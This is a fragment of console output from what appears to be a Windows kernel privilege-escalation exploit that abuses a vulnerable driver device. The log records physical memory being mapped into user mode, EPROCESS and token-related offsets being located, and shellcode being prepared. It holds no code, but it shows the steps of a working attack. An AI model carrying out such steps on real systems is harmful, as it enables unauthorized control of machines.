System\CurrentControlSet\Services\HOGENCKMHRTL) returned 00000000 [+] CreateFileA(\\.\Htsysm72FB) returned 00000140 [+] No SMEP support! [+] Mapping physical memory to user-mode! [+] PhysicalMemoryBegin: 7fff0000 [+] PhysicalMemorySize: 83f800000 [+] CurrentProcessCr3: 32b000000 [+] CurrentEProcess: ffffda03bbec6580 [+] DirectoryTableBase@ 28 [+] UniqueProcessId@ 2e0 [+] ActiveProcessLinks@ 2e8 [+] Status: 0 [+] Creating import shellcode… C:\in>'
